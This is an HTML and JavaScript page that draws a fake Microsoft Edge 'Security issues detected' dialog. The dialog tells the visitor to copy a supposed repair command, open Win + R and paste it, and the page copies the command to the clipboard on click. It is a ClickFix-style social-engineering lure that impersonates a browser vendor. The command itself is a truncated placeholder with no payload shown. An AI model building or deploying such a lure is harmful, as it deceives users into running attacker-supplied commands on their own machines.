<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Edge - Security Issues Detected</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: #1e1e1e;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    font-family: 'Segoe UI', system-ui, sans-serif;
  }
  canvas {
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.75);
    border-radius: 10px;
    cursor: default;
  }
</style>
</head>
<body>
<canvas id="canvas" width="520" height="480"></canvas>

<script>
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

const colors = {
  bg: '#2d2d2d',
  headerTop: '#2a2a2a',
  headerBottom: '#1f1f1f',
  border: '#0078d4',
  text: '#ffffff',
  accent: '#f25022',
  lightText: '#e0e0e0',
  infoTop: 'rgba(255,255,255,0.08)',
  infoBottom: 'rgba(255,255,255,0.02)',
  cmdTop: '#1a1a1a',
  cmdBottom: '#101010',
  cmdText: '#9cf59c',
  copyNormal: '#888',
  copyHover: '#4ade80'
};

let copied = false;
let highlightTime = 0;
let mouseX = 0;
let mouseY = 0;

const command = 'msedge.exe --fix hash=qzyd....';

function roundRect(ctx, x, y, w, h, r) {
  ctx.beginPath();
  ctx.moveTo(x + r, y);
  ctx.lineTo(x + w - r, y);
  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
  ctx.lineTo(x + w, y + h - r);
  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  ctx.lineTo(x + r, y + h);
  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
  ctx.lineTo(x, y + r);
  ctx.quadraticCurveTo(x, y, x + r, y);
  ctx.closePath();
}

function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
  const words = text.split(' ');
  let line = '';
  let currentY = y;
  for (let n = 0; n < words.length; n++) {
    const testLine = line + words[n] + ' ';
    const metrics = ctx.measureText(testLine);
    if (metrics.width > maxWidth && n > 0) {
      ctx.fillText(line, x, currentY);
      line = words[n] + ' ';
      currentY += lineHeight;
    } else {
      line = testLine;
    }
  }
  ctx.fillText(line, x, currentY);
}

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  // Main background
  ctx.fillStyle = colors.bg;
  ctx.shadowColor = 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = 16;
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 4;
  roundRect(ctx, 0, 0, 520, 480, 10);
  ctx.fill();
  ctx.shadowColor = 'transparent';
  ctx.strokeStyle = colors.border;
  ctx.lineWidth = 1;
  ctx.stroke();


  const headerGrad = ctx.createLinearGradient(0, 0, 0, 68);
  headerGrad.addColorStop(0, colors.headerTop);
  headerGrad.addColorStop(1, colors.headerBottom);
  ctx.fillStyle = headerGrad;
  roundRect(ctx, 0, 0, 520, 68, 10);
  ctx.fill();
  ctx.strokeStyle = '#3a3a3a';
  ctx.beginPath();
  ctx.moveTo(0, 68);
  ctx.lineTo(520, 68);
  ctx.stroke();


  ctx.fillStyle = colors.accent;
  ctx.font = 'bold 40px Segoe UI';
  ctx.textAlign = 'left';
  ctx.textBaseline = 'middle';
  ctx.fillText('⚠', 28, 34);


  ctx.fillStyle = colors.accent;
  ctx.font = '600 19px Segoe UI';
  ctx.fillText('Security issues detected', 72, 36);

  let y = 100;


  ctx.fillStyle = colors.lightText;
  ctx.font = '15px Segoe UI';
  wrapText(ctx, "Microsoft Edge has detected potential security threats that may compromise your browsing data.", 32, y, 456, 24);
  y += 78;


  ctx.fillStyle = colors.text;
  ctx.font = '600 15px Segoe UI';
  ctx.fillText('Follow these steps to fix it:', 32, y);
  y += 32;


  const steps = [
    {num: '1', text: 'Copy the command below'},
    {num: '2', text: 'Open Win + R'},
    {num: '3', text: 'Press Ctrl + V and Enter'}
  ];

  steps.forEach(step => {
    ctx.save();
    ctx.shadowColor = 'rgba(0,0,0,0.3)';
    ctx.shadowBlur = 4;
    ctx.shadowOffsetX = 0;
    ctx.shadowOffsetY = 2;
    ctx.fillStyle = '#3a3a3a';
    ctx.beginPath();
    ctx.arc(46, y + 13, 13, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = '#fff';
    ctx.font = '600 14px Segoe UI';
    ctx.textAlign = 'center';
    ctx.fillText(step.num, 46, y + 18);

    ctx.fillStyle = colors.text;
    ctx.textAlign = 'left';
    ctx.fillText(step.text, 72, y + 18);
    y += 38;
  });

  y += 12;


  const infoGrad = ctx.createLinearGradient(30, y, 30, y + 72);
  infoGrad.addColorStop(0, colors.infoTop);
  infoGrad.addColorStop(1, colors.infoBottom);
  ctx.fillStyle = infoGrad;
  ctx.strokeStyle = '#444';
  roundRect(ctx, 30, y, 460, 72, 6);
  ctx.fill();
  ctx.stroke();

  ctx.fillStyle = '#d0d0d0';
  ctx.font = '14.5px Segoe UI';
  ctx.fillText('ℹ️ First, copy the repair command below.', 48, y + 26);
  ctx.fillText('Then follow the steps above to execute it.', 48, y + 48);

  y += 90;


  const cmdGrad = ctx.createLinearGradient(30, y, 30, y + 52);
  cmdGrad.addColorStop(0, colors.cmdTop);
  cmdGrad.addColorStop(1, colors.cmdBottom);
  ctx.fillStyle = highlightTime > Date.now() ? '#2a3a2a' : cmdGrad;
  ctx.strokeStyle = highlightTime > Date.now() ? '#4ade80' : '#555';
  roundRect(ctx, 30, y, 460, 52, 4);
  ctx.fill();
  ctx.stroke();

  ctx.fillStyle = colors.cmdText;
  ctx.font = '14.2px Consolas, Courier New';
  ctx.textAlign = 'left';
  ctx.fillText(command, 48, y + 32);

  const isHover = (mouseX > 430 && mouseX < 490 && mouseY > y && mouseY < y + 52) || copied;
  ctx.textAlign = 'center';
  ctx.fillStyle = isHover ? colors.copyHover : colors.copyNormal;
  ctx.font = '20px Segoe UI';
  ctx.fillText('📋', 460, y + 34);

  if (copied && Date.now() - highlightTime < 1800) {
    ctx.fillStyle = 'rgba(74,222,128,0.2)';
    roundRect(ctx, 30, y, 460, 52, 4);
    ctx.fill();
  }
}

canvas.addEventListener('mousemove', e => {
  const rect = canvas.getBoundingClientRect();
  mouseX = e.clientX - rect.left;
  mouseY = e.clientY - rect.top;
  draw();
});


canvas.addEventListener('click', e => {
  const rect = canvas.getBoundingClientRect();
  const clickX = e.clientX - rect.left;
  const clickY = e.clientY - rect.top;

  
  if (clickX > 430 && clickX < 490 && clickY > 340 && clickY < 392) {
    navigator.clipboard.writeText(command).then(() => {
      copied = true;
      highlightTime = Date.now();
      draw();

      setTimeout(() => {
        copied = false;
        draw();
      }, 1800);
    }).catch(err => {
      console.error('Failed to copy text: ', err);

      alert('Failed to copy the command. Please copy it manually.');
    });
  }
});

draw();
</script>
</body>
</html>
